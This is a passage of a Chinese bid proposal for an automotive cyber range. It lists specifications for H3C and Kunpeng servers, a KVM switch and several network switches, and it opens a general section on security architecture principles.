支持深度休眠模式</p><ol><li>冷却系统</li></ol><p>风扇: 最大支持4个风扇，支持N+1冗余</p><ol><li>安全设置</li></ol><p>CLI接口:</p><p>支持弱口令字典认证使能状态和导入</p><p>开启密码检查功能时，不允许设置弱口令字典内定义的密码</p><ol><li>工作环境</li></ol><p>温度: 长期工作环境温度支持5-45度</p><ol><li>其他配置</li></ol><p>机箱: H3C专用服务器机箱，支持上述配置</p><p>散热: 高效散热系统以支持5-45度的工作环境温度</p><p>管理: 集成H3C iMC管理模块，支持远程管理和监控</p><h3 id="测试工具服务器"><a href="#测试工具服务器" class="headerlink" title="测试工具服务器"></a>测试工具服务器</h3><p>测试工具服务器提供2台全新一代H3C UniServer R4900 G5通过多达32个NVMe SSD1 的支持，以及M.2 SSD形态的引入，进一步增强了面向现代数据中心的扩展能力和配置灵活性。作为一款自主研发的主流2U两路机架式服务器，H3C UniServer R4900 G5基于最新的英特尔®至强®可扩展家族处理器，可实现多达52%的处理器浮点性能提升和42%的核心数量增加，配合8通道3200MT/s DDR4内存技术，为用户提供高达60% 的带宽提升。通过多达14个标准PCIe 4.0插槽和多达41个硬盘插槽1的本地存储支持，实现卓越的扩展能力。96%的电源能效，以及5℃-45℃的标准工作温度设计，为用户提供更高的能效回报。</p><p>故我司提供2台H3C 的2U机架式UniServer R4900 G5 测试工具服务器，该服务器具备以下指标参数信息：</p><ol><li>机器类型：机架式服务器，2U；</li><li>处理器：配置2颗英特尔至强银牌4316处理器，单颗处理器主频2.3GHz, 核数20核；</li><li>内存：配置512GB DDR4内存；</li><li>硬盘：配置2*固态硬盘480GB硬盘8*1800GB 10K rpm的硬盘；</li><li>Raid卡配置独立RAID卡，支持RAID 0,1,5,6，10，50,60，2G缓存，含断电保护；</li><li>接口：2*双口10GE光口（含光模块）</li><li>PCIE：最大可扩展14个PCIe 4.0槽位 ；</li><li>配置900W冗余热插拔电源；</li><li>支持深度休眠，系统下电后，进入深度休眠模式的电源会关闭输出；关闭深度休眠或系统上电后，进入深度休眠模式的电源。</li><li>环境温度：长期工作环境温度支持5-45度</li><li>最大支持4个风扇，支持N+1冗余；</li><li>支持 CLI 接口设置弱口令字典认证使能状态和导入，在开启密码检查功能时不允许设置弱口令字典内定义的密码。</li><li>我司提供三年原厂维保。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/25a3111855786fb77083ba76c637b558.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f4bb7c6ab4d7a339726e1b924a00e6c0.png"></p><h4 id="测试工具务器配置方案"><a href="#测试工具务器配置方案" class="headerlink" title="测试工具务器配置方案"></a>测试工具务器配置方案</h4><ol><li>处理器</li></ol><p>型号: 2x Intel Xeon Silver 4316</p><p>主频: 2.3GHz</p><p>核数: 每颗20核，共40核</p><ol><li>内存</li></ol><p>容量: 512GB DDR4</p><p>规格: 16x 32GB DDR4-2933 RDIMM</p><ol><li>硬盘配置</li></ol><p>固态硬盘(SSD):</p><p>2x H3C 480GB SATA SSD</p><p>机械硬盘(HDD):</p><p>8x H3C 1.8TB 10K RPM SAS HDD</p><p>M.2 SATA SSD:</p><p>支持2x M.2 SATA SSD，支持RAID1，支持热插拔</p><ol><li>RAID卡</li></ol><p>型号: H3C独立RAID卡</p><p>支持RAID级别: 0, 1, 5, 6, 10, 50, 60</p><p>缓存: 2GB，含断电保护</p><ol><li>网络接口</li></ol><p>10GE光口:</p><p>2x 双口10GE光口网卡，含光模块</p><p>PCIe扩展</p><p>槽位: 最大可扩展14个PCIe 4.0槽位</p><ol><li>电源</li></ol><p>功率: 900W</p><p>特性: 冗余热插拔电源</p><p>深度休眠支持: 支持深度休眠模式</p><ol><li>冷却系统</li></ol><p>风扇: 最大支持4个风扇，支持N+1冗余</p><ol><li>安全设置</li></ol><p>CLI接口:</p><p>支持弱口令字典认证使能状态和导入</p><p>开启密码检查功能时，不允许设置弱口令字典内定义的密码</p><ol><li>工作环境</li></ol><p>温度: 长期工作环境温度支持5-45度</p><ol><li>其他配置</li></ol><p>机箱: H3C专用服务器机箱，支持上述配置</p><p>散热: 高效散热系统以支持5-45度的工作环境温度</p><p>管理: 集成H3C iMC管理模块，支持远程管理和监控</p><h3 id="虚拟计算服务器（X86）"><a href="#虚拟计算服务器（X86）" class="headerlink" title="虚拟计算服务器（X86）"></a>虚拟计算服务器（X86）</h3><p>虚拟计算服务器（X86）提供10台全新一代H3C UniServer R4900 G5通过多达32个NVMe SSD1 的支持，以及M.2 SSD形态的引入，进一步增强了面向现代数据中心的扩展能力和配置灵活性。作为一款自主研发的主流2U两路机架式服务器，H3C UniServer R4900 G5基于最新的英特尔®至强®可扩展家族处理器，可实现多达52%的处理器浮点性能提升和42%的核心数量增加，配合8通道3200MT/s DDR4内存技术，为用户提供高达60% 的带宽提升。通过多达14个标准PCIe 4.0插槽和多达41个硬盘插槽1的本地存储支持，实现卓越的扩展能力。96%的电源能效，以及5℃-45℃的标准工作温度设计，为用户提供更高的能效回报。</p><p>故我司提供10台H3C 的2U机架式UniServer R4900 G5 测试工具服务器，该服务器具备以下指标参数信息：</p><ol><li>机器类型：机架式服务器，2U；</li><li>处理器：配置2颗英特尔至强银牌4316处理器，单颗处理器主频2.3GHz, 核数20核；</li><li>内存：配置512GB DDR4内存；</li><li>硬盘：配置2*固态硬盘480GB硬盘8*1800GB 10K rpm的硬盘；</li><li>Raid卡配置独立RAID卡，支持RAID 0,1,5,6，10，50,60，2G缓存，含断电保护；</li><li>接口：2*双口10GE光口（含光模块）</li><li>PCIE：最大可扩展14个PCIe 4.0槽位 ；</li><li>配置900W冗余热插拔电源；</li><li>支持深度休眠，系统下电后，进入深度休眠模式的电源会关闭输出；关闭深度休眠或系统上电后，进入深度休眠模式的电源。</li><li>环境温度：长期工作环境温度支持5-45度</li><li>最大支持4个风扇，支持N+1冗余；</li><li>支持 CLI 接口设置弱口令字典认证使能状态和导入，在开启密码检查功能时不允许设置弱口令字典内定义的密码。</li><li>提供三年原厂维保。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/25a3111855786fb77083ba76c637b558.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f4bb7c6ab4d7a339726e1b924a00e6c0.png"></p><h4 id="虚拟计算服务器（X86）配置方案"><a href="#虚拟计算服务器（X86）配置方案" class="headerlink" title="虚拟计算服务器（X86）配置方案"></a>虚拟计算服务器（X86）配置方案</h4><ol><li>处理器</li></ol><p>型号: 2x Intel Xeon Silver 4316</p><p>主频: 2.3GHz</p><p>核数: 每颗20核，共40核</p><ol><li>内存</li></ol><p>容量: 512GB DDR4</p><p>规格: 16x 32GB DDR4-2933 RDIMM</p><ol><li>硬盘配置</li></ol><p>固态硬盘(SSD):</p><p>2x H3C 480GB SATA SSD</p><p>机械硬盘(HDD):</p><p>8x H3C 1.8TB 10K RPM SAS HDD</p><p>M.2 SATA SSD:</p><p>支持2x M.2 SATA SSD，支持RAID1，支持热插拔</p><ol><li>RAID卡</li></ol><p>型号: H3C独立RAID卡</p><p>支持RAID级别: 0, 1, 5, 6, 10, 50, 60</p><p>缓存: 2GB，含断电保护</p><ol><li>网络接口</li></ol><p>10GE光口:</p><p>2x 双口10GE光口网卡，含光模块</p><p>PCIe扩展</p><p>槽位: 最大可扩展14个PCIe 4.0槽位</p><ol><li>电源</li></ol><p>功率: 900W</p><p>特性: 冗余热插拔电源</p><p>深度休眠支持: 支持深度休眠模式</p><ol><li>冷却系统</li></ol><p>风扇: 最大支持4个风扇，支持N+1冗余</p><ol><li>安全设置</li></ol><p>CLI接口:</p><p>支持弱口令字典认证使能状态和导入</p><p>开启密码检查功能时，不允许设置弱口令字典内定义的密码</p><ol><li>工作环境</li></ol><p>温度: 长期工作环境温度支持5-45度</p><ol><li>其他配置</li></ol><p>机箱: H3C专用服务器机箱，支持上述配置</p><p>散热: 高效散热系统以支持5-45度的工作环境温度</p><p>管理: 集成H3C iMC管理模块，支持远程管理和监控</p><h3 id="虚拟计算服务器（ARM）"><a href="#虚拟计算服务器（ARM）" class="headerlink" title="虚拟计算服务器（ARM）"></a>虚拟计算服务器（ARM）</h3><p>虚拟计算服务器（ARM）提供10台H3C UniServer R4960 G5具有高效能计算、安全可靠、开放生态的优势，适合为大数据、分布式存储、原生应用、高性能计算和数据库等应用高效加速，旨在满足数据中心多样性计算、绿色计算的需求。</p><p>H3C UniServer R4960 G5为2U机架式服务器，专为加速计算而构建。支持2颗鲲鹏处理器，配合8通道2933MHz DDR4技术，为用户提供高达50%的性能提升。通过高达8个PCIe 4.0插槽和多达20块硬盘的本地存储支持，实现卓越的扩展能力。配置冗余的热插拔电源风扇，通过优异的散热设计，支持5~40℃的扩展温度，确保服务器能够7×24小时的长时间稳定运行，为用户提供更高的能效回报。</p><p>故我司提供10台H3C 的2U机架式UniServer R4900 G5 测试工具服务器，该服务器具备以下指标参数信息：</p><ol><li>机器类型：全国产机架式服务器，2U；</li><li>处理器：配置2颗Kunpeng 920处理器；单颗处理器主频2.6GHz, 核数32核；</li><li>内存：配置256GB DDR4内存；</li><li>硬盘：配置2*固态硬盘480GB硬盘4*8000GB的硬盘；</li><li>Raid卡配置独立RAID卡，支持RAID 0,1,5,6，10，50,60，2G缓存，含断电保护；</li><li>接口：配置网口4*GE电口；</li><li>配置正版操作系统授权；</li><li>配置900W冗余热插拔电源；</li><li>我司提供三年原厂维保。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c3110e5d80fb34f44118658e4ef1609a.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/3ec6c90ca970e5b21a1d4f56a565301e.png"></p><h4 id="虚拟计算服务器（ARM）配置方案"><a href="#虚拟计算服务器（ARM）配置方案" class="headerlink" title="虚拟计算服务器（ARM）配置方案"></a>虚拟计算服务器（ARM）配置方案</h4><ol><li>处理器</li></ol><p>型号: 2x Kunpeng 920</p><p>主频: 2.6GHz</p><p>核数: 每颗32核，共64核</p><ol><li>内存</li></ol><p>容量: 256GB DDR4</p><p>规格: 8x 32GB DDR4-2933 RDIMM</p><ol><li>硬盘配置</li></ol><p>固态硬盘(SSD):</p><p>2x 国产480GB SATA SSD</p><p>机械硬盘(HDD):</p><p>4x 国产8TB SATA HDD</p><ol><li>RAID卡</li></ol><p>型号: 国产独立RAID卡</p><p>支持RAID级别: 0, 1, 5, 6, 10, 50, 60</p><p>缓存: 2GB，含断电保护</p><ol><li>网络接口</li></ol><p>GE电口:</p><p>4x 千兆以太网端口</p><ol><li>操作系统</li></ol><p>授权: 正版操作系统授权，具体操作系统版本需根据服务器兼容性和用户需求确定</p><ol><li>电源</li></ol><p>功率: 900W</p><p>特性: 冗余热插拔电源</p><ol><li>服务器机箱</li></ol><p>类型: 2U机架式服务器机箱</p><p>兼容性: 兼容以上列出的硬件配置</p><h2 id="机房设备参数"><a href="#机房设备参数" class="headerlink" title="机房设备参数"></a>机房设备参数</h2><p>5.</p><h3 id="KVM参数"><a href="#KVM参数" class="headerlink" title="KVM参数"></a>KVM参数</h3><p>提供等于2台秦安KVM-1716设备，该设备是一个集成了多端口KVM切换功能于1U高度空间的控制平台，它通过一组设备（包含LCD显示器、键盘、鼠标）实现对多台计算机的操作。从而节省了为每台计算机单独配置键盘、鼠标、监视器的费用以及它们所占用的空间。安装快速简单，只需要将电缆连接到正确的端口上，而无须软件配置，因此不存在复杂的安装过程或不兼容问题。KVM-1716可直接连接并控制16台主机， 支持多硬件平台和多操作系统。该KVM具备如下指标参数信息：</p><ol><li>提供19寸液晶屏幕，键盘，鼠标的一套物理的输入和输出设备。</li><li>提供1路外接VGA视频接口、键盘鼠标外接接口，允许外部设备连接</li><li>支持32端口，可以连接和控制多达32台服务器或计算机</li><li>支持最大连接数256，指的是通过级联连接其他KVM切换器，可以控制的最大服务器数量</li><li>支持混合界面（PS/2 USB)连接各种服务器，工控机设备，可以连接使用PS/2或USB接口的设备</li><li>支持服务器到KVM 直接采用超五类线缆连接， 连接距离最长等于50米，支持长距离连接，最长50米</li><li>支持多种操作系统iMAC, MS,windows,Netware,Unix,Linux,兼容多种不同的操作系统</li><li>具备嵌入管理OSD菜单软件，有一个内置的屏幕显示菜单（On-Screen Display）进行管理和配置</li><li>支持端口加密，扫描，命名，OSD切换，面板按键切换，提供安全特性和便捷的切换功能</li><li>支持热插拔功能，可以在不关闭电源的情况下连接或断开服务器。</li><li>支持级联功能，最大三级级联，可以连接多个KVM切换器，增加控制的服务器数量</li><li>支持切换主机服务器时保存键盘状态信息，在切换控制的服务器时，保持键盘的状态</li><li>支持本地用户视频分辨率1280*1024 60Hz，支持特定的视频分辨率和刷新率</li><li>工作温度0°至 50°C (32°至 122°F)。这是指KVM切换器在正常运行时的环境温度范围。在这个温度范围内，设备应该能够正常工作而不会出现性能下降或损坏。</li><li>存储温度-20°至 60°C (-4°至 140°F)。这是指设备在关闭和未使用时可以安全存放的环境温度范围。在这个范围外，极端的温度可能会对设备的物理组件造成损害。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/de9e7fc42716366e4e534d20818fa090.jpeg" alt="8口PS2控制平台"></p><h2 id="网络设备参数"><a href="#网络设备参数" class="headerlink" title="网络设备参数"></a>网络设备参数</h2><p>6.</p><h3 id="汇聚交换机"><a href="#汇聚交换机" class="headerlink" title="汇聚交换机"></a>汇聚交换机</h3><p>汇聚交换机选用1台品牌为：H3C新华三，型号为： S5024X-HPWR-E的汇聚交换机，该汇聚交换机可用于连接多个边缘交换机或终端设备，并将它们的流量聚合到核心网络中。汇聚交换机通常用于构建大型企业网络或数据中心网络，以提供高带宽、高可靠性和灵活性的网络连接。</p><p>该交换机具备如下指标参数信息：</p><ol><li>传输速率支持万兆传输，10/100/1000/10000Mbps，可以处理高速网络连接，包括万兆以太网</li><li>包转发率276Mpps，设备每秒可以转发高达276百万个包</li><li>该交换机支持传输网络协议支持IEEE 802.1P，IEEE 802.1Q，IEEE 802.1d，IEEE 802.1ad，IEEE 802.3x，IEEE 802.3ad，IEEE 802.3等</li><li>支持基于VLAN的ACL，可以设置基于虚拟局域网的访问控制策略</li><li>支持Ingress/Egress ACL，可以控制进入和离开网络的流量，以及流量的速率限制</li><li>支持Ingress/Egress CAR，该交换机的粒度可达8Kbps</li><li>支持两级Meter能力，能够进行两级流量监测和控制</li><li>支持VLAN聚合CAR，MAC聚合CAR功能，支持基于VLAN和MAC地址的流量速率限制</li><li>支持流量整形，可以控制数据流，以避免网络拥塞</li><li>支持802.1P/DSCP优先级Mark/Remark，支持对流量进行优先级标记，以便在网络中进行优先传输</li><li>支持层次化QoS（H-QoS），支持高级的服务质量管理，包括三级队列调度</li><li>支持队列调度机制，包括SP（Strict Priority）、WRR（Weighted Round Robin）、SP+WRR和CBWFQ（Class-Based Weighted Fair Queueing）等调度策略</li><li>配备了24个千兆以太网光接口，这些接口使用小型可插拔（SFP）模块，与LC（Lucent Connector）类型的光纤连接器相兼容，适用于连接长距离、高速度的光纤网络。此外，设备还提供4个万兆以太网光接口，使用增强型小型可插拔（SFP+）模块，也配备LC类型的光纤连接器，支持更高速率的数据传输，适合数据中心、核心网络或连接至高速上游网络的应用。支持SC（Subscriber Connector或Standard Connector）类型的连接器</li><li>提供了48个千兆以太网电接口模块，这些接口采用常见的RJ45连接器，适用于标准的双绞线电缆连接，以支持多达48个千兆位以太网连接</li><li>配备了双交流电源模块，每个模块的功率为300瓦，提供冗余电源功能以确保持续不间断的运行</li><li>该网络设备支持各种文件传输协议，包括FTP（文件传输协议）、TFTP（简单文件传输协议）和Xmodem，这些协议允许用户通过网络上传和下载文件。</li><li>支持简单网络管理协议（SNMP）的v1、v2和v3版本，这是一种广泛使用的网络管理协议，用于监控和管理网络设备以及其上的数据流</li><li>支持sFlow标准，这是一种基于采样的流量监测技术，用于实时收集网络流量信息</li><li>支持远程监控（RMON），一种网络管理协议，允许管理员远程监控网络操作和性能数据，以便进行故障排除和网络性能提升</li><li>支持网络时间协议（NTP），确保设备时钟与全球统一时间标准同步，为网络事件记录和安全协议提供准确的时间戳</li><li>支持NetStream流量统计功能，它可以详细记录网络流量信息，助力管理员进行流量分析、容量规划和网络安全监控</li><li>支持Portal认证功能，允许实施基于Web的用户身份验证，以控制和管理设备网络访问权限</li><li>支持MAC地址认证，通过验证设备的物理地址来控制网络接入，增强了对网络资源的安全管理</li><li>支持IEEE 802.1x端口基础访问控制协议和内置IEEE 802.1x服务器功能，为网络提供基于身份的认证和授权，以增强网络访问安全性</li><li>支持AAA/Radius协议，实现了认证、授权和计费功能，以提供集中的用户访问管理，确保网络资源的安全性和合规性</li><li>支持HWTACACS协议，允许通过命令行进行认证，实现了对用户身份的验证以及对命令访问的控制，从而增强了网络的安全管理</li><li>支持SSHv1.5和SSHv2，为远程管理提供了安全的加密连接，以防止敏感数据在传输过程中被截获或篡改</li><li>支持ACL（访问控制列表）流过滤机制，允许细粒度地控制进出网络的数据流，从而实现高效的安全管理和流量控制</li><li>支持OSPF、RIPv2及BGPv4协议，并提供明文及MD5加密认证选项，以确保路由信息的完整性和网络之间的安全通信</li><li>支持命令行采用分级保护方式，防止未授权用户的非法侵入，为不同级别的用户有不同的配置权限</li><li>支持通过限制只有特定IP地址的用户能够通过Telnet登录，并采用口令认证机制，增强了远程访问的安全性</li><li>支持能够实现IP地址、VLAN ID、MAC地址和端口等多种属性的组合绑定，从而提供灵活的网络资源管理和增强的访问控制策略</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/3f37a76c3533534a710744f5f3702ec6.png"></p><h3 id="接入交换机"><a href="#接入交换机" class="headerlink" title="接入交换机"></a>接入交换机</h3><p>接入交换机选用6台品牌为：H3C新华三，型号为：S4080X-HPWR-F的接入交换机，该接入交换机可用于连接多个边缘交换机或终端设备，并将它们的流量聚合到核心网络中。接入交换机通常用于构建大型企业网络或数据中心网络，以提供高带宽、高可靠性和灵活性的网络连接。</p><p>该交换机具备如下指标参数信息：</p><ol><li>支持千兆交换功能，能够自适应10/100/1000Mbps的传输速率，确保与不同速率的网络设备兼容并优化性能</li><li>具备24个10/100/1000Base-T自适应以太网端口，提供灵活的网络连接选项，并包含8个可作为光纤或电缆接口使用的combo口，以满足多样化的网络部署需求</li><li>提供4个万兆SFP+口，可进行快速的光电交换</li><li>提供了1个标准的RJ-45控制台接口、1个console口和1个Micro USB控制台接口，用于本地管理和配置</li><li>具备高级VLAN功能，支持基于端口、MAC地址、协议和IP子网的VLAN划分，以及QinQ、灵活QinQ、VLAN映射、Voice VLAN和MVRP等多样化的VLAN配置选项</li><li>包转发率为216百万包每秒（Mpps），能够高效处理大量网络流量</li><li>供一个可扩展插槽，支持多种接口板卡选项，包括2端口40GE QSFP+、2端口万兆SFP+、2端口万兆电口、8端口万兆SFP+和12端口万兆SFP+，以满足不同的网络扩展需求</li><li>支持通过XModem、FTP、TFTP进行软件加载和升级，并允许用户通过命令行接口（CLI）、Telnet和Console口进行配置</li><li>支持SNMPv1/v2/v3和WEB网管，提供RMON告警、事件和历史记录功能，兼容iMC智能管理中心，并具备系统日志记录、分级告警以及调试信息输出能力</li><li>支持网络时间同步（NTP），具备电源、风扇和温度告警功能，并能执行Ping和Tracert网络诊断命令</li><li>具备VCT电缆检测功能，支持DLDP单向链路检测协议和LLDP协议，并能进行Loopback-detection端口环回检测</li><li>支持L2至L4包过滤功能，可以根据源MAC地址、目的MAC地址、源IP（IPv4/IPv6）地址、目的IP（IPv4/IPv6）地址、TCP/UDP端口号、VLAN进行流量分类，并支持时间段ACL、双向ACL策略，允许在VLAN基础上应用ACL，并能对端口的接收和发送报文速率进行限制。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/e440b134a581b40c03d248d4e9a147ca.png"></p><h3 id="POE交换机"><a href="#POE交换机" class="headerlink" title="POE交换机"></a>POE交换机</h3><p>POE交换机选用1台品牌为：H3C新华三，型号为：S5055X-HPWR的POE交换机，该POE交换机可用于连接多个边缘交换机或终端设备，并将它们的流量聚合到核心网络中。POE交换机通常用于构建大型企业网络或数据中心网络，以提供高带宽、高可靠性和灵活性的网络连接。</p><p>该交换机具备如下指标参数信息：</p><ol><li>支持千兆交换功能，能够自适应10/100/1000Mbps的传输速率，确保与不同速率的网络设备兼容并优化性能</li><li>具备126百万包每秒（Mpps）的包转发能力</li><li>配备了24个10/100/1000Base-T以太网端口（包括8个可作为combo口使用的端口）和4个10G BASE-X SFP+万兆光纤端口</li><li>支持基于端口的VLAN，支持基于MAC的VLAN，基于协议的VLAN</li><li>支持QinQ和灵活QinQ功能，允许在一个VLAN标签内嵌套另一个VLAN标签，以实现复杂的网络层次和扩展的虚拟网络</li><li>支持VLAN映射（VLAN Mapping）以实现跨不同VLAN的数据流重定向，支持Voice VLAN以优化语音数据的传输，并支持通用VLAN注册协议（GVRP）以自动管理VLAN成员资格和分布</li><li>支持IGMP Snooping和MLD Snooping功能，能够有效管理和优化IPv4和IPv6多播流量，通过监控Internet Group Management Protocol (IGMP)和Multicast Listener Discovery (MLD)消息来确保多播数据仅被发送至对应的订阅接收者</li><li>支持组播VLAN功能，允许将多播流量限制在特定的VLAN内，以提高网络效率并减少不必要的多播流量扩散</li><li>具备复杂的流量管理功能，能够对端口的接收和发送报文速率进行限制，支持报文重定向和CAR（Committed Access Rate）以控制带宽使用，提供每个端口8个输出队列，并通过端口队列调度策略（如SP、WRR、SP+WRR）及802.1p和DSCP优先级重新标记来优化服务质量（QoS）</li><li>提供全面的安全性特性，包括分级用户管理与口令保护，支持802.1X、MAC地址以及Triple认证，Guest VLAN功能，RADIUS认证，SSH 2.0加密访问，端口隔离与安全，MAC地址学习数量限制，IP源地址保护，ARP入侵检测，IP+MAC+端口绑定以及EAD（Endpoint Admission Defense）端点准入防御系统</li><li>最小电源功率需求为27瓦，适用于交流电（AC）供电<ul><li>MAX：</li><li>单360W:334W（PoE为280W）</li><li>双360W:678W（PoE为600W）</li><li>单560W:573W（PoE为480W）</li><li>双560W:918W（PoE为810W）</li><li>单720W:676W（PoE为600W）</li><li>双720W:905W（PoE为810W）</li><li>单1110W:898W（PoE为810W）</li><li>双1110W:905W（PoE为810W）</li></ul></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/bf1d7da2abebba3581bd1d58d7ff2753.png"></p><h3 id="万兆交换机"><a href="#万兆交换机" class="headerlink" title="万兆交换机"></a>万兆交换机</h3><p>万兆交换机选用3台品牌为：H3C新华三，型号为：S7003XS的万兆交换机，该万兆交换机可用于连接多个边缘交换机或终端设备，并将它们的流量聚合到核心网络中。万兆交换机通常用于构建大型企业网络或数据中心网络，以提供高带宽、高可靠性和灵活性的网络连接。</p><p>该交换机具备如下指标参数信息：</p><ol><li>采用1U机架式设计，适合标准机架安装，占用空间高度为一个单位（1U）；</li><li>提供48个10G Base-T以太网端口和4个40G QSFP+光纤端口，以支持高速网络连接；</li><li>具备1.28Tbps的交换能力，并支持高达11.52Tbps的交换容量扩展；</li><li>数据包转发率为每秒960百万个数据包（Mpps）；</li><li>支持存储转发（store-forward）模式和直通（cut-through）模式两种数据包转发机制；</li><li>支持IRF2智能弹性架构，允许2至9台设备的本地或远程堆叠，实现分布式管理、链路聚合和路由，并采用基于LACP、BFD、ARP的MAD机制进行堆叠分裂检测；</li><li>支持多达4094个基于端口的VLAN，包括默认VLAN、超级VLAN和私有VLAN（PVLAN）功能；</li><li>支持多种链路冗余和网络恢复协议，包括生成树协议（STP）、快速生成树协议（RSTP）、多生成树协议（MSTP），以及SmartLink、快速环网保护协议（RRPP）和符合G.8032标准的以太环保护协议（ERPS）</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/e532fb28963ab11e4320bf7a06335f39.png"></p><h3 id="千兆交换机"><a href="#千兆交换机" class="headerlink" title="千兆交换机"></a>千兆交换机</h3><p>千兆交换机选用3台品牌为：新华三（H3C），型号为：S5120V3-52P的千兆交换机，该千兆交换机可用于连接多个边缘交换机或终端设备，并将它们的流量聚合到核心网络中。千兆交换机通常用于构建大型企业网络或数据中心网络，以提供高带宽、高可靠性和灵活性的网络连接。</p><p>该交换机具备如下指标参数信息：</p><ol><li>配备48个10/100/1000BASE-T以太网端口，4个兼容10G和1G速率的BASE-X SFP+光模块端口，1个用于额外端口扩展的槽位，以及2个风扇模块和2个电源模块的可更换槽位；</li><li>拥有1.28Tbps的交换容量，并且在堆叠模式下可以达到11.52Tbps的总交换容量；</li><li>具备每秒最高960百万个包的转发能力；</li><li>支持存储转发模式和直通模式两种包转发模式；</li><li>虚拟化功能通过IRF2智能弹性架构实现分布式设备管理、链路聚合和弹性路由，支持2到9台设备的本地和远程堆叠，并采用基于LACP、BFD、ARP的MAD机制进行堆叠分裂检测；</li><li>支持基于端口的VLAN，最多可配置4094个VLAN，并提供默认VLAN、超级VLAN和私有VLAN的功能；</li><li>支持STP/RSTP/MSTP，支持SmartLink、RRPP，支持ERPS以太环保护协议（G.8032）。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/93221f59fae199bd4f5ba999a05c7787.png"></p><h2 id="网络安全防护"><a href="#网络安全防护" class="headerlink" title="网络安全防护"></a>网络安全防护</h2><p>我司提供详尽的网络安全防护方案，具备防护APT攻击、常见网络安全攻击能力。详细方案如下。</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>基于XXXX汽车网络靶场的业务需求，以及靶场面临的安全问题，很难通过一次安全建设将数据中心面临的所有风险解决；同时，安全风险也是动态发展变化的，因此我们的解决方案也需要随着靶场的安全需求变化不断完善和发展。在云计算时代数据中心信息安全架构时，不能像传统IDC系统集成或者安全集成那样，头痛医头，脚痛医脚，而应该充分结合虚拟化的特点来系统地进行规划，考虑数据中心外围物理实体以及虚拟化平台环境的各类安全需求和特性，从而达到各类安全产品、安全管理、整体安全策略的统一，发挥最大的效率。在设计数据中心安全建议方案时，充分利用现有国和国际安全标准和成熟的安全体系，结合系统的实际需求，利用在安全领域的成熟经验，设计出一个有针对性的安全设计方案。解决思路如下：</p><ol><li><p>对靶场进行安全域划分，根据各区域的业务特性、技术特性以及安全需求进行对应的安全防护设计；</p></li><li><p>要充分考虑网络层、操作系统层、虚拟化层、应用层以及数据层的安全防护需求，特别是虚拟化等新技术带来的问题。</p></li><li><p>强调安全运营的价值，实现预警、检测、响应、溯源的闭环流程；</p></li></ol><h3 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h3><ul><li>业务保障原则：安全体系的设计目标是能够更好的保障网络上承载的业务。在保证安全的同时，还要保障业务的正常运行和运行效率。</li><li>结构简化原则：安全架构规划的直接目的和效果是要将整个网络变得更加简单，简单的网络结构便于设计防护体系。比如，安全域划分并不是粒度越细越好，安全域数量过多过杂可能导致安全域的管理过于复杂和困难。</li><li>立体协防原则：应避免形成各个安全产品独立割裂的安全体系，充分利用威胁情报和大数据等新技术，实现网络、终端、边界的立体协防机制。</li><li>等级保护原则：根据业务系统的重要程度以及考虑风险威胁、安全需求、安全成本等因素，将其划为不同的安全保护等级并采取相应的安全保护技术、管理措施。</li><li>可扩展性原则：当有新的业务系统需要接入数据中心时，可按照等级保护、对端可信度等原则将其分别划分至不同安全等级域的各个子域。</li><li>可管理性原则：应当采用集中化、自动化、智能化的安全管理手段，减轻安全的负担，同时减小因为管理上的疏漏而对系统安全造成的威胁。</li></ul><h3 id="安全建设要求"><a href="#安全建设要求" class="headerlink" title="安全建设要求"></a>安全建设要求</h3><ul><li>确保汽车安全运营平台及相关系统能持续、稳定、可靠运行，并确保信息内容的机密性、完整性、可用性，抵御黑客、病毒、恶意代码等对信息系统发起的各类攻击和破坏，防止对外服务中断和由此造成的系统运行事故。</li><li>系统防护参照以《网络安全等级保护基本要求》中三级保护要求为控制要求，建设基础安全技术体系框架</li><li>通过成熟可靠的安全技术及安全产品，结合专业技术人员的安全技术经验和能力，系统化的搭建安全技术体系，确保技术体系的安全性与可用性的有机结合，达到适用性要求</li><li>安全技术体系建设覆盖通信网络、区域边界、计算环境安全等方面</li><li>结合网络环境及网络域的划分，输出安全域以及对应安全防护方案，确保系统平台的整体安全可靠。</li></ul><p>建立基础安全技术体系框架：参照《网络安全等级保护基本要求》中的三级保护要求，搭建基础安全技术体系框架。这包括使用成熟可靠的安全技术和安全产品，结合专业技术人员的安全技术经验和能力，确保技术体系的安全性和可用性有机结合，满足适用性要求。</p><p>引入成熟的安全技术和产品：选择符合行业标准和规范的成熟安全技术和产品，例如防火墙、入侵检测系统、反病毒软件等。这些安全技术和产品可以提供网络流量监控、异常检测、恶意代码拦截等功能，有效抵御黑客、病毒和恶意代码对信息系统的攻击和破坏。</p><p>建立安全域与安全防护方案：结合网络环境和网络域的划分，制定安全域划分方案，并相应地实施安全防护措施。安全域划分可以将系统划分为不同的安全区域，根据不同的安全等级和敏感程度设置相应的安全防护措施，以确保整体系统的安全可靠。</p><p>加强通信网络安全：通过采用加密协议、身份认证、访问控制等手段，保障通信网络的安全性。这包括对数据传输进行加密保护，确保机密性和完整性；采用身份认证技术，确认通信双方的身份和可信度；设置访问控制策略，限制非授权访问等。</p><p>建立全面的安全监控和审计机制：引入日志记录、行为分析、异常检测等技术手段，实现对系统的全面安全监控和审计。及时发现异常行为并采取相应的响应和处置措施，防止对外服务中断和系统运行事故的发生。</p><p>通过以上措施，可以有效增强汽车安全运营平台